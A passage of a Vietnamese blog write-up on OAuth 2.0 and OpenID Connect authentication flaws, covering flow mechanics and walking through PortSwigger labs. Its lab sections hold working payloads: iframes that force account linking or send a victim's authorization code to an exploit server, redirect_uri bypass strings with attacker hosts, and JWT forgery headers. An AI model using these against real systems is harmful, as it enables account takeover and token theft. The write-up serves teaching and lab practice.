---
title: "Các lỗ hổng OAuth 2.0 Authentication"
description: "Phân tích luồng OAuth, OpenID Connect và 5 lab PortSwigger: authentication bypass, forced linking, rò rỉ code/token, open redirect và SSRF. Mở rộng với PKCE, ID token và account linking."
date: 2026-10-29 11:00:00 +0700
lang: vi
categories: [Web Security, PortSwigger Labs]
tags: [oauth, openid-connect, authentication, account-takeover, portswigger, writeup]
toc: true
media_subpath: /assets/img/posts/2026-10-29-oauth-authentication
pin: false
---

## I. OAuth là gì mà lại dùng để đăng nhập?

Chắc mọi người đã gặp những nút như **Login with Google**, **Continue with Facebook** hay **Sign in with GitHub** rồi. Mình muốn vào một website, nhưng thay vì tạo thêm mật khẩu thì lại được đưa sang một dịch vụ khác để đăng nhập, bấm đồng ý rồi quay trở lại website ban đầu.

Nhìn thì khá đơn giản, nhưng phía sau có nhiều bên trao đổi dữ liệu với nhau. Nếu một bên kiểm tra thiếu `redirect_uri`, tin nhầm email do trình duyệt gửi lên hoặc liên kết tài khoản mà không ràng buộc với phiên khởi tạo, attacker có thể chen vào luồng này.

Trước hết cần phân biệt hai khái niệm:

- **Authentication — xác thực:** Bạn là ai?
- **Authorization — ủy quyền:** Ứng dụng được làm gì, với tài nguyên nào?

**OAuth 2.0 là một framework ủy quyền.** Ví dụ, mình cho một ứng dụng đọc ảnh trên dịch vụ lưu trữ mà không cần đưa mật khẩu của dịch vụ đó cho ứng dụng. OAuth cung cấp cơ chế cấp và sử dụng quyền truy cập, không tự định nghĩa đầy đủ một giao thức đăng nhập cho người dùng. Xem định nghĩa trong [RFC 6749](https://www.rfc-editor.org/rfc/rfc6749.html#section-1).

Vậy tại sao lại có “OAuth Authentication”? Vì ứng dụng có thể dùng quyền truy cập vừa được cấp để lấy thông tin người dùng rồi tạo phiên đăng nhập nội bộ. **OpenID Connect (OIDC)** bổ sung một lớp danh tính trên OAuth 2.0, trong đó có ID token dành cho việc xác thực. Còn trong các lab, mình cũng sẽ gặp cách ứng dụng tự ghép thông tin từ API vào luồng đăng nhập.

Bài này đi từ kiến thức nền trong ghi chú của mình, sau đó phân tích 5 lab PortSwigger và mở rộng một số case liên quan. Các hostname `YOUR-LAB-ID`, `YOUR-OAUTH-ID`, `YOUR-EXPLOIT-ID` và token trong ví dụ cần được thay bằng giá trị của phiên lab đang làm.

---

## II. Các thành phần trong một luồng OAuth

### 1. Bốn vai trò chính

| Vai trò | Nhiệm vụ | Ví dụ |
| --- | --- | --- |
| Resource owner | Người có quyền cho phép truy cập tài nguyên. | Mình, chủ tài khoản social media. |
| Client application | Ứng dụng muốn được cấp quyền truy cập. | Website blog có nút đăng nhập bằng social media. |
| Authorization server | Xử lý việc cấp quyền và phát hành token. | Dịch vụ OAuth của social media. |
| Resource server | Cung cấp API truy cập tài nguyên được bảo vệ. | API trả profile, email hoặc ảnh của mình. |

Authorization server và resource server có thể nằm trong cùng một dịch vụ, nhưng vai trò khác nhau. Trong trình duyệt, mình thường thấy cả domain website blog lẫn domain OAuth. Cookie phiên ở hai bên cũng phục vụ hai phiên khác nhau.

Ví dụ, logout khỏi blog không nhất thiết logout khỏi social media. Khi quay lại đăng nhập OAuth, dịch vụ social media có thể nhận ra mình ngay và không yêu cầu nhập lại mật khẩu. Chi tiết này rất quan trọng với các lab mà victim đã có sẵn phiên trên OAuth provider.

### 2. Các giá trị hay gặp

| Giá trị | Dùng để làm gì? | Điểm cần nhớ |
| --- | --- | --- |
| `client_id` | Định danh client đã đăng ký. | Không phải bí mật, xuất hiện trong URL là bình thường. |
| `client_secret` | Một cách xác thực confidential client tại token endpoint. | Không thể giữ bí mật thực sự nếu nhúng trong JavaScript gửi cho mọi trình duyệt. |
| `redirect_uri` | Callback mà authorization server đưa trình duyệt về. | Phải được kiểm tra theo URI đã đăng ký, không chỉ nhìn domain. |
| `response_type` | Chọn loại phản hồi ở authorization endpoint. | `code` và `token` dẫn đến các luồng khác nhau. |
| `scope` | Phạm vi quyền client đang xin. | Quyền được cấp thực tế có thể hẹp hơn yêu cầu. |
| `state` | Liên kết authorization response với giao dịch do client khởi tạo. | Cần khó đoán, gắn với phiên và được kiểm tra khi quay về. |
| `nonce` | Ràng buộc ID token với yêu cầu OIDC tương ứng. | Cần được đối chiếu với claim trong ID token khi áp dụng. |
| `code_challenge`, `code_verifier` | Hai phần của PKCE. | Ràng buộc bước xin code với bước đổi code. |

**Public client** như ứng dụng chạy trong browser hoặc ứng dụng native không được coi một secret nhúng sẵn là bằng chứng đủ để xác thực client. **Confidential client** như backend web có thể bảo vệ thông tin xác thực phía server. Authorization Code không chỉ dành cho backend: public client cũng dùng được, kết hợp PKCE.

### 3. Code, token và session không phải một thứ

Đây là chỗ mình thấy rất dễ nhầm khi mới nhìn Burp history:

| Thành phần | Ai dùng? | Mục đích |
| --- | --- | --- |
| Authorization code | Client gửi tới token endpoint. | Đổi lấy token; ngắn hạn và chỉ được sử dụng một lần. |
| Access token | Client gửi tới resource server. | Gọi API trong phạm vi được cấp. Có thể là chuỗi opaque hoặc JWT. |
| ID token | OIDC client kiểm tra. | Nhận thông tin về sự kiện xác thực và danh tính user. |
| Refresh token | Client gửi tới token endpoint nếu được cấp. | Xin access token mới, không dùng để gọi API tài nguyên trực tiếp. |
| Session cookie | Browser gửi cho website client. | Duy trì phiên đăng nhập nội bộ của website. |

Mất code và mất access token tạo ra những đường khai thác khác nhau. Code còn phải được đổi trong đúng điều kiện; bearer access token thường đã dùng được với API nhận token đó. ID token lại có đối tượng nhận riêng, không phải thứ có thể tùy tiện mang đi gọi mọi API.

#### ID token và các claim bắt buộc kiểm tra

ID token là JWT do OIDC provider ký, chứa thông tin về sự kiện xác thực. **Việc nhận được một ID token không có nghĩa là token đó đáng tin** — client phải kiểm tra đủ các claim sau trước khi dùng danh tính bên trong:

| Claim | Ý nghĩa | Hậu quả nếu bỏ qua |
| --- | --- | --- |
| `iss` (issuer) | Token phải đến từ đúng provider. | Attacker tự phát hành token từ provider khác mà client vẫn tin. |
| `aud` (audience) | Token phải được phát hành cho đúng `client_id` của mình. | Token xin cho ứng dụng A được dùng để đăng nhập ứng dụng B. |
| `exp` (expiration) | Token phải còn hiệu lực. | Token cũ bị đánh cắp vẫn có thể replay. |
| `nonce` | Phải khớp với giá trị gửi trong authorization request. | Attacker replay ID token của một phiên cũ hoặc của user khác. |
| `at_hash` | Ràng buộc ID token với access token cụ thể trong hybrid flow. | Attacker thay access token đi kèm mà ID token không phát hiện. |

Ngoài các claim, client phải xác minh chữ ký của JWT theo đúng thuật toán trong header. Hai kiểu tấn công phổ biến:

- **`alg: none`**: Attacker sửa payload rồi xóa chữ ký, đặt `"alg":"none"`. Thư viện cũ hoặc cấu hình sai có thể chấp nhận token không có chữ ký.
- **Algorithm confusion (RS256 → HS256)**: Provider ký bằng RSA private key, client verify bằng public key với RS256. Nếu attacker đổi header sang `HS256` và ký bằng public key của provider (vốn không bí mật), một số thư viện sẽ dùng public key đó làm HMAC secret và xác nhận hợp lệ.

```text
Header gốc:   {"alg":"RS256","typ":"JWT"}
Header sửa:   {"alg":"HS256","typ":"JWT"}
Secret dùng:  public key RSA của provider (lấy từ JWKS endpoint)
Kết quả:      client verify thành công mà attacker tự tạo payload
```

Để tránh, client cần chỉ định cứng thuật toán được chấp nhận, không để thư viện tự suy từ header của token nhận về.

Một điểm nữa liên quan đến việc lấy public key: provider JWKS thường cho phép lookup key theo `kid` (key ID) trong header JWT. Nếu server dùng `kid` để tra file hoặc truy vấn database mà không sanitize:

```json
{"alg":"HS256","kid":"../../dev/null","typ":"JWT"}
```

Path traversal trong `kid` có thể khiến server dùng nội dung file không mong muốn làm key. Trường hợp khác là `kid` injection vào SQL query để trả về key tùy ý, sau đó attacker ký token bằng key đó.

---

## III. Luồng OAuth hoạt động như thế nào?

### 1. Authorization Code Grant

![Sơ đồ Authorization Code: browser nhận code, backend đổi token và gọi API](image.png)

Hình trong ghi chú mô tả luồng website dùng thông tin từ OAuth để đăng nhập. Mình tách từng bước để nhìn rõ dữ liệu đi qua đâu.

#### Bước 1: Authorization request

Client hướng trình duyệt đến authorization endpoint:

```http
GET /auth?client_id=blog-client&redirect_uri=https%3A%2F%2Fclient.example%2Foauth-callback&response_type=code&scope=openid%20profile%20email&state=RANDOM-STATE HTTP/1.1
Host: auth.example
```

Client muốn nhận `code`, xin các scope `openid profile email` và yêu cầu quay lại callback đã đăng ký. `openid` cho thấy đây là một yêu cầu hướng đến OIDC, dù vẫn phải kiểm tra provider xử lý và trả về những gì.

Client lưu `state` ở phía mình, gắn với giao dịch và phiên khởi tạo. Provider trả lại giá trị đó khi xử lý response tương ứng; chỉ echo lại `state` thôi chưa chống được CSRF nếu client không đối chiếu.

#### Bước 2: User login và consent

Authorization server xác thực user nếu cần, sau đó xử lý việc user cho phép client truy cập các scope. Phiên đã có hoặc consent đã ghi nhớ có thể khiến một số màn hình không xuất hiện lại.

Mật khẩu của user được nhập ở provider, không phải đưa cho website blog.

#### Bước 3: Callback nhận authorization code

```http
HTTP/1.1 302 Found
Location: https://client.example/oauth-callback?code=ONE-TIME-CODE&state=RANDOM-STATE
```

Browser đi theo redirect và gửi request tới website client:

```http
GET /oauth-callback?code=ONE-TIME-CODE&state=RANDOM-STATE HTTP/1.1
Host: client.example
Cookie: session=CLIENT-SESSION
```

Client cần kiểm tra giao dịch tương ứng trước khi tiếp tục. Code không phải mật khẩu của user và cũng chưa phải access token.

#### Bước 4: Client đổi code lấy token

Với backend web, request sau diễn ra **server-to-server**:

```http
POST /token HTTP/1.1
Host: auth.example
Authorization: Basic BASE64_CLIENT_CREDENTIALS
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=ONE-TIME-CODE&redirect_uri=https%3A%2F%2Fclient.example%2Foauth-callback
```

`BASE64_CLIENT_CREDENTIALS` là chỗ điền giá trị Basic authentication phù hợp; cách xác thực client phụ thuộc cấu hình provider. Với luồng dùng PKCE, request còn có `code_verifier`.

**Vì sao không thấy request này trong Burp của mình?** Vì Burp đang proxy traffic trình duyệt, còn backend client gọi thẳng sang token endpoint. Muốn quan sát bước đó cần log hoặc quyền kiểm tra backend tương ứng.

#### Bước 5: Token response

Ví dụ response của một OIDC Code Flow:

```json
{
  "access_token": "ACCESS-TOKEN",
  "token_type": "Bearer",
  "expires_in": 3600,
  "scope": "openid profile email",
  "id_token": "ID-TOKEN-JWT"
}
```

`ID-TOKEN-JWT` ở đây chỉ là placeholder. OAuth thuần không bắt buộc có ID token. Client còn phải kiểm tra token và các ràng buộc của luồng trước khi tin danh tính trả về.

#### Bước 6: Gọi resource API

```http
GET /userinfo HTTP/1.1
Host: auth.example
Authorization: Bearer ACCESS-TOKEN
```

```json
{
  "sub": "user-123",
  "name": "Nam",
  "email": "nam@example.com",
  "email_verified": true
}
```

`/userinfo` là endpoint gắn với OIDC; tên `/me` trong các lab là API cụ thể của dịch vụ lab, không phải tên cố định cho mọi OAuth provider.

#### Bước 7: Tạo phiên của website

Sau khi xác định đúng tài khoản nội bộ, website tạo session cookie cho browser. Từ đây request tới blog dùng cookie của blog. Những lần gọi API provider có thể vẫn dùng access token do backend quản lý.

```text
Browser ── authorization request ──► Provider
Browser ◄── redirect có code ────── Provider
Browser ── callback có code ──────► Client backend
                                   │
                                   ├── đổi code lấy token ──► Provider
                                   └── gọi API user ────────► Resource server
Browser ◄── session cookie ──────── Client backend
```

### 2. Implicit Grant

![Sơ đồ Implicit Grant: access token được trả trực tiếp qua browser](image-1.png)

Trong các lab dùng implicit, request có `response_type=token`. Provider bỏ qua bước trả code rồi đổi token, thay bằng redirect chứa access token ngay trong fragment:

```http
HTTP/1.1 302 Found
Location: https://client.example/oauth-callback#access_token=ACCESS-TOKEN&token_type=Bearer&expires_in=3600
```

Khi browser đi đến URL trên, HTTP request chỉ có:

```http
GET /oauth-callback HTTP/1.1
Host: client.example
```

Phần sau `#` không nằm trong request target gửi đến server. Nhưng JavaScript trên trang có thể đọc nó bằng `location.hash`. Response `Location` đi qua proxy vẫn có thể cho mình thấy fragment mà server đã trả về.

Điểm quan trọng là token đi qua môi trường browser. Script trong trang, lịch sử URL hoặc một chuỗi redirect sai có thể làm lộ nó. Không gửi fragment trong HTTP request không có nghĩa fragment được cách ly khỏi mọi JavaScript.

Implicit được phân tích ở đây để hiểu các lab và hệ thống cũ. [RFC 9700](https://www.rfc-editor.org/rfc/rfc9700.html#section-2.1.2) khuyến cáo tránh phát hành access token trực tiếp qua authorization response, ưu tiên Code Flow. Trong OIDC chuẩn, response type chỉ có `token` không phải một OIDC authentication flow hoàn chỉnh, kể cả khi ví dụ lab có `scope=openid`.

#### Tại sao fragment không đi vào HTTP request?

Khi browser nhận `Location: https://client.example/callback#access_token=XYZ`, nó gửi:

```http
GET /callback HTTP/1.1
Host: client.example
```

Phần `#access_token=XYZ` không có trong dòng request. Đây là đặc tả HTTP: fragment dùng để định vị nội dung phía client, không phải tài nguyên phía server. Server không bao giờ nhận được fragment qua request. Chỉ JavaScript trên trang mới đọc được qua `window.location.hash` hoặc `document.location.hash`.

Điều này có hai hệ quả đối lập nhau:
- **Tốt:** token không nằm trong server log, không lộ qua HTTP access log của server thông thường.
- **Xấu:** token tồn tại trong memory của trình duyệt, history URL và môi trường JavaScript — mọi script cùng origin đều đọc được.

#### Token leak qua Referer header và navigation

Khi trang callback JavaScript điều hướng sang trang khác sau khi xử lý token, một số trình duyệt hoặc thư viện có thể đưa URL chứa fragment vào header `Referer` của request tiếp theo. Ví dụ:

```javascript
// Trang /callback đọc token xong rồi redirect
window.location.href = "https://client.example/dashboard";
```

Request tới `/dashboard` có thể mang:

```http
GET /dashboard HTTP/1.1
Referer: https://client.example/callback#access_token=ACCESS-TOKEN
```

Ngoài Referer, `postMessage` dùng không đúng cũng tạo rủi ro tương tự. Nếu trang callback broadcast message chứa token mà không kiểm tra `origin` của người nhận:

```javascript
// Nguy hiểm: không kiểm tra origin
window.addEventListener("message", (e) => {
    useToken(e.data.access_token);
});

// Frame cha broadcast cho mọi origin
window.parent.postMessage({ access_token: token }, "*");
```

Bất kỳ frame nào trên trang đều có thể lắng nghe và đọc token. Cần dùng `targetOrigin` cụ thể thay vì `"*"` và xác minh `event.origin` ở bên nhận.

### 3. Authorization Code + PKCE

PKCE bổ sung bằng chứng rằng bên đổi code biết một giá trị được tạo ra từ lúc khởi tạo giao dịch:

```text
code_verifier  = chuỗi ngẫu nhiên đủ mạnh, giữ tại client cho giao dịch
code_challenge = BASE64URL(SHA256(ASCII(code_verifier)))
```

Authorization request mang `code_challenge` và `code_challenge_method=S256`. Token request mang `code_verifier`; server tính lại và so sánh. Người chỉ chặn được code mà không có verifier sẽ không đổi được code trong luồng được bảo vệ đúng.

Ví dụ kiểm tra bằng Node.js với cặp giá trị mẫu của [RFC 7636](https://www.rfc-editor.org/rfc/rfc7636.html#appendix-B):

```javascript
const { createHash } = require("node:crypto");

// Giá trị cố định chỉ để minh họa, không tái sử dụng cho phiên thật.
const verifier = "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk";
const challenge = createHash("sha256")
  .update(verifier, "ascii")
  .digest("base64url");

console.log(challenge);
// E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM
```

PKCE không xác thực danh tính của public client như một client secret, cũng không thay việc kiểm tra redirect URI hoặc danh tính user. Một attacker tự khởi tạo giao dịch thì vẫn biết verifier của chính giao dịch đó.

#### PKCE downgrade và `plain` method

PKCE chỉ có giá trị khi provider **bắt buộc** sử dụng nó. Nếu server chấp nhận authorization request không có `code_challenge`, attacker có thể đơn giản bỏ tham số này. Khi đó code bị chặn có thể đổi token mà không cần verifier — PKCE trở thành optional thay vì ràng buộc bảo mật thực sự.

`code_challenge_method` có hai giá trị được RFC 7636 định nghĩa:

| Method | Tính toán challenge | Độ an toàn |
| --- | --- | --- |
| `S256` | `BASE64URL(SHA256(verifier))` | Attacker chỉ có challenge không suy ngược được verifier. |
| `plain` | challenge = verifier | Ai lấy được challenge trong authorization request là lấy được verifier. |

Với `plain`, nếu authorization request bị lộ (ví dụ qua Referer hoặc log server), attacker có ngay verifier để đổi code. `S256` nên được dùng mặc định và provider nên từ chối `plain` khi `S256` khả dụng. [RFC 7636 section 4.2](https://www.rfc-editor.org/rfc/rfc7636#section-4.2) ghi rõ `S256` là SHOULD, client chỉ dùng `plain` khi không thể tính SHA-256.

### 4. `state`, `nonce` và PKCE khác nhau ở đâu?

| Cơ chế | Giá trị được kiểm tra ở đâu? | Mối liên hệ cần bảo vệ |
| --- | --- | --- |
| `state` | Client đối chiếu callback với giao dịch đã lưu. | Browser session và authorization response. |
| `nonce` | OIDC client đối chiếu claim trong ID token. | Yêu cầu xác thực và ID token nhận về. |
| PKCE | Token endpoint kiểm tra verifier. | Giao dịch xin code và bên đổi code. |

Không thể nhìn một tham số rồi kết luận toàn bộ luồng đã an toàn. Giá trị phải được sinh, lưu và kiểm tra đúng. Theo [hướng dẫn chống CSRF trong RFC 9700](https://www.rfc-editor.org/rfc/rfc9700.html#section-2.1), một số triển khai có thể dựa vào PKCE hoặc OIDC nonce khi đáp ứng đủ điều kiện; vì vậy thiếu `state` là dấu hiệu cần điều tra, chưa tự động là một lỗ hổng có thể khai thác.

#### Login CSRF vs Account-linking CSRF — impact khác nhau

Cùng là thiếu `state`, nhưng impact phụ thuộc vào mục đích của luồng OAuth:

**Login CSRF**: Attacker buộc browser của victim hoàn tất luồng đăng nhập bằng tài khoản OAuth của *attacker*. Victim sẽ đăng nhập vào trang với tài khoản attacker mà không hay biết. Nếu victim sau đó nhập thông tin nhạy cảm (ví dụ: địa chỉ, thẻ tín dụng), attacker có thể đọc dữ liệu đó sau khi lấy lại session.

```text
Attacker tạo authorization URL với account của mình
→ Gửi callback URL (chứa code của attacker) cho victim
→ Browser victim hoàn tất callback
→ Victim đang dùng tài khoản attacker mà nghĩ là tài khoản mình
```

**Account-linking CSRF**: Attacker buộc tài khoản của victim *liên kết* với OAuth profile của *attacker*. Impact nghiêm trọng hơn: attacker chiếm toàn quyền tài khoản victim. Đây là kịch bản của Lab 2.

```text
Attacker khởi tạo linking → lấy code của mình → gửi callback URL cho victim
→ Browser victim hoàn tất callback với cookie của victim
→ Tài khoản victim liên kết với OAuth profile của attacker
→ Attacker đăng nhập bằng OAuth profile của mình → vào tài khoản victim
```

Khi code review hoặc kiểm tra thực tế, cần phân biệt endpoint nào dùng cho login thuần và endpoint nào dùng cho linking. Một callback thiếu phân biệt ngữ cảnh có thể bị dùng cho cả hai mục đích, tạo ra bề mặt tấn công rộng hơn dự định.

---

## IV. Thực hành các lab trong ghi chú

### 1. Lab: Authentication bypass via OAuth implicit flow

**Link Lab:** [Authentication bypass via OAuth implicit flow](https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow)

![Đề bài yêu cầu đăng nhập tài khoản Carlos mà không biết mật khẩu](image-2.png)

Mục tiêu là đăng nhập tài khoản Carlos với email `carlos@carlos-montoya.net`. Lab cấp tài khoản social media `wiener:peter` để mình khảo sát luồng bình thường.

#### Quan sát đăng nhập

Chọn My account rồi đăng nhập bằng social media. Trong Burp history, client chuyển browser sang endpoint `/auth` của provider:

![Authorization request trong Burp với response_type=token](image-3.png)

`response_type=token` cho thấy đây là implicit flow. Sau khi nhập tài khoản, provider hỏi mình có đồng ý chia sẻ Profile và Email cho website blog không:

![Màn hình consent xin quyền Profile và Email](image-4.png)

Đồng ý xong, provider trả redirect có access token trong fragment:

![Response Location chứa access token sau dấu #](image-5.png)

JavaScript của client đọc token, lấy thông tin user rồi gửi request về endpoint `/authenticate` của chính blog. Điểm đáng chú ý là body chứa cả email, username và token.

#### Thay danh tính nhưng giữ nguyên token

Gửi request `/authenticate` sang Repeater, giữ token vừa được cấp cho mình và sửa thông tin sang Carlos:

```http
POST /authenticate HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/json

{"email":"carlos@carlos-montoya.net","username":"carlos","token":"YOUR-OWN-ACCESS-TOKEN"}
```

![Request dùng email Carlos cùng token của người tấn công và response tạo session](image-6.png)

Ứng dụng chấp nhận và trả session mới. Có thể lặp lại thao tác qua Proxy interception để browser nhận `Set-Cookie`, hoặc dùng cookie của response khi kiểm tra request tiếp theo trong lab.

Lỗi ở đây nằm tại bước client application chuyển dữ liệu browser thành danh tính đăng nhập. **Token hợp lệ của mình không chứng minh email Carlos là của mình.** Backend phải lấy và xác minh danh tính gắn với token ở provider tin cậy, thay vì chọn tài khoản theo email do browser tự khai.

```text
Token của Wiener + email tự khai của Carlos
  → backend không đối chiếu danh tính
  → session của Carlos
```

Đây là lỗi binding giữa token và danh tính, không phải bằng chứng rằng chỉ cần dùng implicit là luôn bypass được đăng nhập.

### 2. Lab: Forced OAuth profile linking

**Link Lab:** [Forced OAuth profile linking](https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking)

![Đề bài forced linking: liên kết social profile của mình vào tài khoản admin](image-7.png)

Website có đăng nhập bằng username/password và tùy chọn gắn thêm social profile. Tài khoản blog là `wiener:peter`, còn tài khoản social là `peter.wiener:hotdog`.

Mục tiêu là khiến **social profile của attacker được liên kết với tài khoản blog của admin**, sau đó đăng nhập bằng social profile của mình để vào tài khoản admin.

#### Nhận diện request liên kết

Sau khi login blog, chọn Attach a social profile. Authorization request có callback riêng:

```http
GET /auth?client_id=YOUR-CLIENT-ID&redirect_uri=https%3A%2F%2FYOUR-LAB-ID.web-security-academy.net%2Foauth-linking&response_type=code&scope=openid%20profile%20email HTTP/1.1
Host: oauth-YOUR-OAUTH-ID.oauth-server.net
```

Trong lab này, request không có `state` và callback không kiểm tra đủ việc người đang hoàn tất liên kết có phải người đã khởi tạo nó hay không.

#### Lấy code chưa bị dùng

Bật Proxy interception, khởi tạo lại thao tác liên kết bằng social account của mình. Khi bắt được:

```http
GET /oauth-linking?code=ATTACKER-UNUSED-CODE HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=ATTACKER-BLOG-SESSION
```

Copy URL rồi **Drop request**, không forward tới blog. Nếu forward, client có thể đổi code ngay và code sẽ bị tiêu thụ; gửi lại cho victim không còn tác dụng.

#### Gửi callback cho victim

Trên exploit server của lab:

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=ATTACKER-UNUSED-CODE"></iframe>
```

Victim đã đăng nhập blog. Khi browser của victim gọi callback với cookie của họ, server nhận code đại diện social profile của attacker nhưng chọn tài khoản blog từ **session của victim**. Vì thiếu ràng buộc giao dịch, hai danh tính bị ghép lại.

```text
Code: social profile của attacker
Cookie callback: tài khoản blog của admin
  → liên kết social profile attacker với blog admin
```

Sau khi deliver exploit, quay lại blog và chọn login bằng social media của mình. Nếu liên kết thành công, mình vào tài khoản admin rồi xóa `carlos` theo yêu cầu lab.

Trong ghi chú có form tự submit; nếu dùng cách đó thì action phải là `/oauth-linking`, đúng endpoint quan sát được, không phải `/oauth-link`. Với hệ thống khác, cookie SameSite và cơ chế nhúng có thể khiến iframe không gửi phiên; cần kiểm tra request thật. Payload trên là luồng của lab, không phải mọi website đều có cùng điều kiện.

**Phòng chống:** gắn thao tác liên kết với phiên và giao dịch khởi tạo, kiểm tra bằng chứng chống CSRF, yêu cầu xác nhận phù hợp cho hành động nhạy cảm. Login và linking cần phân biệt rõ mục đích, không dùng một callback thiếu ngữ cảnh để tự quyết định cả hai.

### 3. Lab: OAuth account hijacking via redirect_uri

**Link Lab:** [OAuth account hijacking via redirect_uri](https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri)

![Đề bài lấy authorization code của admin để chiếm tài khoản](image-8.png)

Phần ghi chú này thuộc nhóm “Leaking authorization codes and access tokens”. Với lab cụ thể, mình đánh cắp **authorization code**, không phải access token.

#### Thay nơi nhận code

Luồng bình thường yêu cầu callback về blog:

```http
GET /auth?client_id=YOUR-CLIENT-ID&redirect_uri=https%3A%2F%2FYOUR-LAB-ID.web-security-academy.net%2Foauth-callback&response_type=code&scope=openid%20profile%20email HTTP/1.1
Host: oauth-YOUR-OAUTH-ID.oauth-server.net
```

Nếu provider chấp nhận đổi `redirect_uri` thành domain của exploit server, mình có thể khiến browser của victim đưa code tới đó:

```html
<iframe src="https://oauth-YOUR-OAUTH-ID.oauth-server.net/auth?client_id=YOUR-CLIENT-ID&amp;redirect_uri=https%3A%2F%2FYOUR-EXPLOIT-ID.exploit-server.net%2Fexploit&amp;response_type=code&amp;scope=openid%20profile%20email"></iframe>
```

Victim trong lab đã có phiên tại provider. Khi luồng chạy thành công, exploit server nhận request dạng:

```http
GET /exploit?code=VICTIM-UNUSED-CODE HTTP/1.1
Host: YOUR-EXPLOIT-ID.exploit-server.net
```

Đọc access log, lấy code rồi truy cập callback thật của blog bằng browser của mình:

```text
https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=VICTIM-UNUSED-CODE
```

Trong lab có thể dùng code đó để tạo phiên admin, sau đó vào admin panel và xóa `carlos`.

#### Vì sao không cần biết client secret?

Mình không nhất thiết tự gọi `/token`. Callback của ứng dụng thật có thể đóng vai trò đổi code giúp attacker. Backend có client credential hợp lệ nhưng không xác nhận đủ giao dịch đang hoàn tất thuộc về browser nào và code được phát hành trong ngữ cảnh nào.

Do đó, khả năng chiếm tài khoản còn phụ thuộc các kiểm tra tại token endpoint và callback: code binding với client/redirect URI, PKCE, giao dịch và phiên. Trong một triển khai đúng, đổi `redirect_uri` có thể bị chặn ngay hoặc code bị từ chối ở bước đổi token. **Không phải cứ thấy một code trong log là mặc định replay được ở mọi client.**

**Phòng chống:** provider kiểm tra chính xác callback đã đăng ký và binding của code; client bảo vệ giao dịch, dùng PKCE phù hợp, từ chối callback không có giao dịch hợp lệ. Không dựa riêng vào client secret để bảo vệ luồng đi qua browser.

#### Các kỹ thuật bypass redirect_uri kiểm tra không chặt

Lab 3 dùng trường hợp đơn giản nhất: provider không kiểm tra gì cả. Thực tế, provider thường có kiểm tra nhưng dễ bị vượt qua:

**1. Chỉ kiểm tra domain, không kiểm tra path**

Provider chấp nhận mọi path trong domain đã đăng ký. Kết hợp với open redirect trên domain đó là có thể rò rỉ token — đây chính xác là kịch bản Lab 4.

**2. Prefix match thay vì exact match**

Nếu provider kiểm tra `redirect_uri` phải bắt đầu bằng URI đã đăng ký:

```
Đã đăng ký: https://client.example/oauth-callback
Bypass:      https://client.example/oauth-callback.evil.com/
             https://client.example/oauth-callbackEVIL
```

**3. Subdomain wildcard hoặc regex lỏng**

```
Đã đăng ký: https://*.client.example/callback
Bypass:      https://evil.client.example/callback   ← attacker kiểm soát subdomain
```

Hoặc regex dùng dấu `.` thay vì `\.`:

```
Pattern:  client.example  (dấu chấm không escape)
Khớp:     clientXexample  (X là bất kỳ ký tự nào)
```

**4. Parameter pollution và fragment injection**

Một số parser chấp nhận:

```
redirect_uri=https://client.example/callback?extra=param
redirect_uri=https://client.example/callback#fragment
```

Trong trường hợp dùng `?`, authorization server có thể append `?code=...` thành:

```
https://client.example/callback?extra=param?code=CODE
```

Browser gửi toàn bộ path đến server, nhưng ứng dụng client có thể parse `code` sai. Với `#`, server append code vào query nhưng trước fragment, fragment của attacker vẫn nằm đó.

**5. Localhost bypass trong native app**

Native app thường đăng ký `http://localhost/callback`. Nếu provider chấp nhận `localhost` theo nghĩa rộng:

```
http://localhost.evil.com/callback   ← một số parser cũ coi là localhost
http://127.0.0.1/callback            ← đôi khi được chấp nhận thay http://localhost
```

RFC 8252 dành cho native app cho phép port bất kỳ trên loopback, nhưng không đồng nghĩa provider phải chấp nhận mọi biến thể. Ngoài ra còn có các dạng biểu diễn IP tương đương mà filter kiểm tra chuỗi đơn thuần không phát hiện: `http://2130706433/` (decimal), `http://0x7f000001/` (hex), `http://[::1]/` (IPv6). Các domain wildcard DNS như `attacker.127.0.0.1.sslip.io` resolve về chính IP đó cũng có thể qua được filter kiểm tra hostname.

**6. `@` authority confusion**

```
https://trusted.example.com@attacker.example.com/callback
```

Kiểm tra bằng `startsWith("https://trusted.example.com")` → đúng. Nhưng trong URL syntax, phần trước `@` là userinfo, phần sau mới là host. Browser gửi request đến `attacker.example.com` với username là `trusted.example.com`.

Khi pentest, nên thử đủ các biến thể trên với từng cặp URI đã đăng ký quan sát được.

### 4. Lab: Stealing OAuth access tokens via an open redirect

**Link Lab:** [Stealing OAuth access tokens via an open redirect](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect)

![Đề bài yêu cầu đánh cắp access token của admin và dùng key API của họ để hoàn thành lab](image-9.png)

Đây là lab implicit flow như lab 1, nhưng provider đã kiểm tra `redirect_uri`. Mình không thể sửa thẳng `redirect_uri` sang exploit server nữa.

#### Nhận diện cơ chế

Authorization request cho thấy `response_type=token`, xác nhận implicit flow. Provider sẽ trả access token qua fragment ngay sau bước consent:

```http
GET /auth?client_id=YOUR-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback&response_type=token&nonce=RANDOM&scope=openid%20profile%20email HTTP/1.1
Host: oauth-YOUR-OAUTH-ID.oauth-server.net
```

Khi provider redirect về callback, access token nằm sau `#` trong URL:

```http
HTTP/1.1 302 Found
Location: https://YOUR-LAB-ID.web-security-academy.net/oauth-callback#access_token=ACCESS-TOKEN&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
```

Client JavaScript đọc `location.hash`, gọi `/me` để lấy thông tin, rồi tạo session. Sau khi xác nhận luồng bình thường, thử thay `redirect_uri` sang domain khác: provider từ chối vì chỉ chấp nhận hostname đã đăng ký.

#### Tìm open redirect trên domain được phép

